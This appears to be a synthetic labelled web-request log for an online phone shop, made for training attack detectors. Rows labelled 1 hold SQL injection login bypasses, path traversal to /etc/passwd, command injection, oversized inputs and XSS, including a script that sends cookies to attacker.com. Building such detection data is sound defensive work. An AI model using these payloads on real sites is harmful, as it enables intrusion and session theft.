timestamp,ip,method,path,payload,label
07:42:51.4,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:42:52.8,192.168.1.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:42:55.3,192.168.1.175,GET,/order/myorders,,0
07:42:57.6,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:42:59.4,10.0.0.79,POST,/auth/login,"{'csrf_token': 'Im1xCxDGlavo6gZc1cwiUDJl0FwOYsiwvUUltN7SJb'.juz6hE7t.CwSOHnDNGZbBdtjAZnlIuaPysFa1, 'username': 'user81', 'password': ')PurHXssVOKQ', 'submit': 'Log in'}",0
07:43:01.0,10.0.0.195,GET,/auth/logout,,0
07:43:03.5,103.75.118.228,GET,/../../../../etc/passwd,,1
07:43:05.6,10.0.0.195,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:43:07.6,10.0.0.195,POST,/auth/login,"{'csrf_token': 'ImqNbIt8Rom6VLf5CRo2LqJzD1uJNLukEjkffTvqjO'.nTma1Cpy.y62EHiNj-vwDc0YLxkFtkBoCWzps, 'username': 'user13', 'password': 'hcMclf4XqBj%', 'submit': 'Log in'}",0
07:43:09.3,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:43:11.7,10.0.0.67,GET,/product/2,,0
07:43:13.1,192.168.1.18,POST,/auth/register,"{'csrf_token': 'ImosZV9Dj8lmOTtQCC8Ywx14TLiAPfJn1ygUt6J8qq'.CtmUTBTu.PVg5I95KcaCRLTr9pTZqktr741Xk, 'username': 'newuser13', 'email': 'a50@b.com', 'password': 'OnutE51MSIiC', 'submit': 'Register'}",0
07:43:15.2,192.168.1.22,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:43:17.3,192.168.1.169,GET,/product/1,,0
07:43:18.8,192.168.1.165,GET,/product/2,,0
07:43:21.6,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:43:23.5,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:43:25.0,10.0.0.106,POST,/auth/login,"{'csrf_token': 'ImTCMWZfEH6FXPYXYhwq5blcdv5P68PCuLmSIr0h6Z'.TSgA7EuY.Nzvl7Y9Bxgvv7wGJeUrIsEzzgRyU, 'username': 'user54', 'password': 's^dO84CiIw6c', 'submit': 'Log in'}",0
07:43:27.5,10.0.0.106,POST,/auth/login,"{'csrf_token': 'Im4SGeflZdm2GaUl86IyeGLKVNpSosWRKOwbEx2rNY'.1ATdiQgb.6-1hmmgnmKf9co7jHPX4TzkjY9dt, 'username': 'user32', 'password': 'WCnxTc0sdWA2', 'submit': 'Log in'}",0
07:43:29.7,192.168.1.169,GET,/auth/login,,0
07:43:31.7,192.168.1.144,POST,/auth/register,"{'csrf_token': 'ImyEqXfhfINfrk5HIXGobcfJngakQG6Bk0rKDNeQ44'.2cso58Ao.pbQoE33RgKeDoqNUDKhMuDlEg9nb, 'username': 'newuser36', 'email': 'a91@b.com', 'password': 'cMyUVhKTu2Ow', 'submit': 'Register'}",0
07:43:33.2,203.162.4.190,GET,/product/1' AND 1=1,,1
07:43:35.7,192.168.1.167,GET,/order/myorders,,0
07:43:37.0,192.168.1.12,GET,/auth/register,,0
07:43:39.5,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:43:41.4,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:43:43.1,203.162.4.190,GET,/product/1' AND 1=1,,1
07:43:45.2,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:43:47.5,10.0.0.28,POST,/search,{'query': 'iphone 15 pro max'},0
07:43:49.2,192.168.1.175,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:43:51.4,192.168.1.151,GET,/order/myorders,,0
07:43:52.8,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:43:54.8,192.168.1.197,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:43:57.4,192.168.1.162,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:43:59.7,203.162.4.191,GET,/../../../../etc/passwd,,1
07:44:01.5,192.168.1.167,GET,/order/myorders,,0
07:44:03.6,10.0.0.15,POST,/auth/login,"{'csrf_token': 'ImNBwYRq0sD0nVR2riiZyRVNZ8dEkO0ieVLHyHVFKv'.rYEht3rz.HOsWmNsgO4ryATcJHR-MWZhvdL6c, 'username': 'user56', 'password': '7BhmrboFxqWN', 'submit': 'Log in'}",0
07:44:05.1,192.168.1.165,GET,/auth/login,,0
07:44:07.3,103.75.118.228,GET,/../../../../etc/passwd,,1
07:44:09.4,203.162.4.190,GET,/../../../../etc/passwd,,1
07:44:11.2,192.168.1.46,GET,/auth/login,,0
07:44:13.2,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:44:15.0,203.162.4.191,GET,/product/1' AND 1=1,,1
07:44:17.5,192.168.1.50,POST,/search,{'query': 'iphone 15 pro max'},0
07:44:19.0,192.168.1.50,GET,/auth/register,,0
07:44:21.3,192.168.1.56,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:44:23.7,10.0.0.28,GET,/order/myorders,,0
07:44:25.0,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
07:44:27.1,192.168.1.151,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:44:29.2,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
07:44:30.9,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:44:32.8,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:44:34.9,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:44:37.7,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:44:38.7,203.162.4.191,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:44:40.9,192.168.1.50,POST,/search,{'query': 'iphone 15 pro max'},0
07:44:43.3,192.168.1.185,POST,/search,{'query': 'iphone 15 pro max'},0
07:44:45.6,192.168.1.56,GET,/auth/register,,0
07:44:46.9,192.168.1.144,POST,/auth/register,"{'csrf_token': 'Im6ChGgKgNFc1fSE4lxa3Ue6fNoFXox0IR9dreJZKg'.jznTKvvx.ZMXYJ4qjEIeYMBXG5Iy8R7xnQc7b, 'username': 'newuser71', 'email': 'a76@b.com', 'password': 'IwpjdLw4L%CQ', 'submit': 'Register'}",0
07:44:49.1,192.168.1.28,POST,/search,{'query': 'iphone 15 pro max'},0
07:44:51.6,192.168.1.50,GET,/,,0
07:44:53.6,192.168.1.151,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:44:55.0,192.168.1.141,GET,/order/cart,,0
07:44:57.2,192.168.1.175,GET,/product/1,,0
07:44:59.2,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:45:01.4,10.0.0.15,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:45:03.4,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:45:04.8,192.168.1.162,GET,/,,0
07:45:06.8,192.168.1.12,POST,/search,{'query': 'iphone 15 pro max'},0
07:45:09.7,10.0.0.66,GET,/product/2,,0
07:45:11.5,192.168.1.167,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:45:13.5,10.0.0.15,GET,/product/1,,0
07:45:15.3,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:45:16.8,192.168.1.162,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:45:19.2,192.168.1.167,POST,/auth/register,"{'csrf_token': 'Im7rCqZCCFGb4HN3DvIgvGZ8sTKcgCYD8tqn5yQ7ff'.LmkcXRZ4.Bw8zHeIWUckX10q-Ebggi7hFhVA3, 'username': 'newuser74', 'email': 'a93@b.com', 'password': '&D7pYoCM%G0&', 'submit': 'Register'}",0
07:45:20.8,192.168.1.12,GET,/product/2,,0
07:45:23.5,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:45:25.0,192.168.1.185,GET,/auth/login,,0
07:45:27.1,10.0.0.106,GET,/order/myorders,,0
07:45:29.0,203.162.4.190,GET,/product/1' AND 1=1,,1
07:45:30.9,192.168.1.46,POST,/auth/login,"{'csrf_token': 'ImEPUAuLNJQMzlM2sVNm4BKGkD4vlbRlEU3fs405Fx'.o7PSkQvE.bUBXHv3k7TPEulYARq8SIhu7oafY, 'username': 'user92', 'password': '2MS85n&Qmor)', 'submit': 'Log in'}",0
07:45:33.5,10.0.0.67,GET,/product/1,,0
07:45:35.4,10.0.0.82,GET,/category/Iphone,,0
07:45:37.4,10.0.0.146,GET,/auth/register,,0
07:45:39.2,103.75.118.228,GET,/product/1' AND 1=1,,1
07:45:41.4,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:45:43.0,203.162.4.190,GET,/product/1,,0
07:45:45.6,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:45:47.5,203.162.4.190,GET,/order/myorders,,0
07:45:49.1,192.168.1.162,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:45:51.4,203.162.4.190,POST,/auth/login,"{'csrf_token': 'ImzGXWb4I80W36ZZOWyxPkWB7PVHXv5CNaR8XejEGr'.8GzfP4gr.YW8oo6qVoRDWnGs3fYxWTKNO6mVZ, 'username': 'user68', 'password': 'V$vkA8Pvfw%t', 'submit': 'Log in'}",0
07:45:53.5,192.168.1.197,GET,/auth/register,,0
07:45:55.2,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:45:57.7,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
07:45:59.2,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
07:46:00.9,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:46:03.3,10.0.0.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:46:05.6,192.168.1.28,GET,/order/cart,,0
07:46:07.3,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:46:08.8,192.168.1.12,POST,/auth/login,"{'csrf_token': 'ImQdoUba40afOXkJ6BMod7HcBgZiqGIjDjojxu5AtT'.PKVS7ihx.1EZYiDPBAZWvQLIrMBYl3Zv_rZzf, 'username': 'user59', 'password': '@jPXq4*)p4*H', 'submit': 'Log in'}",0
07:46:11.2,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:46:13.0,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
07:46:15.3,192.168.1.55,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:46:17.4,192.168.1.18,GET,/,,0
07:46:19.5,192.168.1.18,GET,/order/myorders,,0
07:46:21.2,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:46:23.1,192.168.1.104,GET,/,,0
07:46:25.3,103.75.118.228,GET,/product/1' AND 1=1,,1
07:46:27.1,103.75.118.228,GET,/../../../../etc/passwd,,1
07:46:29.3,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
07:46:31.1,192.168.1.12,GET,/auth/login,,0
07:46:33.4,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:46:35.7,192.168.1.104,GET,/auth/logout,,0
07:46:37.6,203.162.4.191,POST,/auth/register,"{'csrf_token': 'ImHEbteAtvW8ekmT7UL74QQgwc8WJOSuPN5t5imT8g'.fNRjOiEo.nPDCZB2T7EIR5S-mboGe3aIn4ah9, 'username': 'newuser45', 'email': 'a83@b.com', 'password': 'nCCvUFOlqgX5', 'submit': 'Register'}",0
07:46:39.1,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:46:40.9,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
07:46:42.8,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
07:46:45.0,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:46:47.1,192.168.1.182,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:46:49.0,10.0.0.67,GET,/auth/logout,,0
07:46:51.4,10.0.0.176,GET,/product/2,,0
07:46:53.0,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:46:55.3,203.162.4.190,GET,/../../../../etc/passwd,,1
07:46:56.9,203.162.4.190,GET,/category/Iphone,,0
07:46:59.7,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:47:01.2,192.168.1.175,GET,/category/Iphone,,0
07:47:03.1,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:47:05.2,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:47:06.8,192.168.1.18,GET,/auth/login,,0
07:47:09.6,103.75.118.228,GET,/../../../../etc/passwd,,1
07:47:11.0,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:47:12.9,192.168.1.55,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:47:15.1,10.0.0.67,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:47:17.6,192.168.1.56,POST,/auth/login,"{'csrf_token': 'ImGsPWhZISbp0d92QhN3vfFMK4mdmB2aHJKhAHFLBA'.wqY3WQ7i.P6MlhSqrTNG0_laPkf2yKxrFAjUa, 'username': 'user11', 'password': 'qrK5&WYG8uP9', 'submit': 'Log in'}",0
07:47:18.8,192.168.1.55,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:47:21.1,10.0.0.82,GET,/,,0
07:47:23.5,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
07:47:25.3,192.168.1.175,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:47:27.6,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
07:47:29.7,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:47:30.9,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
07:47:32.8,192.168.1.175,POST,/auth/register,"{'csrf_token': 'ImZrSi8pmVDBqvuVYIHUCuiJ2aHvF74zhTyb0XjuIJ'.cimNJYJT.CwFqlCGs0zzm1HB3EVGsDHTOvlil, 'username': 'newuser100', 'email': 'a96@b.com', 'password': 'CV&CO$%c$5sK', 'submit': 'Register'}",0
07:47:35.2,192.168.1.162,GET,/product/2,,0
07:47:37.3,192.168.1.18,GET,/auth/login,,0
07:47:39.0,192.168.1.167,GET,/auth/register,,0
07:47:41.3,192.168.1.55,GET,/order/cart,,0
07:47:43.3,192.168.1.141,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:47:45.6,127.0.0.1,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:47:47.1,103.75.118.228,GET,/../../../../etc/passwd,,1
07:47:49.0,192.168.1.28,GET,/order/cart,,0
07:47:51.2,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:47:53.3,10.0.0.79,POST,/auth/login,"{'csrf_token': 'ImvxRZV4WhvC7uDr2w1BcPUvDvWvGu53llvdazXSMH'.1h1Tnxg5.sUCyor1ktcMNp83dUZLl1RLs5e63, 'username': 'user32', 'password': 'F4KV%MG0uQlR', 'submit': 'Log in'}",0
07:47:54.9,192.168.1.56,GET,/auth/login,,0
07:47:57.6,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:47:59.3,10.0.0.79,GET,/category/Iphone,,0
07:48:01.5,192.168.1.46,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:48:03.7,10.0.0.66,POST,/search,{'query': 'iphone 15 pro max'},0
07:48:05.3,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:48:06.9,203.162.4.191,GET,/category/Iphone,,0
07:48:08.9,203.162.4.191,GET,/../../../../etc/passwd,,1
07:48:11.0,192.168.1.169,GET,/product/1,,0
07:48:13.5,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:48:15.3,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:48:16.8,192.168.1.144,POST,/search,{'query': 'iphone 15 pro max'},0
07:48:19.0,192.168.1.22,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:48:20.8,192.168.1.46,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:48:23.6,10.0.0.15,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:48:25.6,103.75.118.228,GET,/../../../../etc/passwd,,1
07:48:27.5,192.168.1.151,POST,/auth/register,"{'csrf_token': 'Im9dR3kKFDGp8zF4fzyyay3cQYocoGfhXwBDKhN3TJ'.sEtfcm4n.gNLdtmeJ7f0wDXa92uOaoVwqNxAU, 'username': 'newuser33', 'email': 'a75@b.com', 'password': 'G6KV&cJhKz)4', 'submit': 'Register'}",0
07:48:28.9,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:48:30.8,192.168.1.56,GET,/product/2,,0
07:48:33.7,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:48:35.0,192.168.1.167,GET,/product/1,,0
07:48:37.4,10.0.0.79,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:48:39.5,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:48:41.1,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:48:43.6,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
07:48:45.0,192.168.1.175,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:48:47.3,203.162.4.190,GET,/product/1' AND 1=1,,1
07:48:49.7,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:48:51.1,192.168.1.182,GET,/,,0
07:48:53.0,192.168.1.22,POST,/auth/register,"{'csrf_token': 'ImVwC6UnF7mfOaniVVhkR04n5B6NqPvmAkmW61gWHP'.p7MXeNtn.eWDJBlbeKmBuMCzNqPGU47yZB-Eg, 'username': 'newuser75', 'email': 'a70@b.com', 'password': 'n5s6lf(4sM@0', 'submit': 'Register'}",0
07:48:54.9,192.168.1.50,POST,/auth/login,"{'csrf_token': 'ImhTD17rf605V5iSn2gDhHX4LkDDd6bMMQi2ECUA8q'.jR8GqqMb.c8Yck81Rplf880VCC5ST3b16Ptvb, 'username': 'user28', 'password': 'IeMSHeIy@&xI', 'submit': 'Log in'}",0
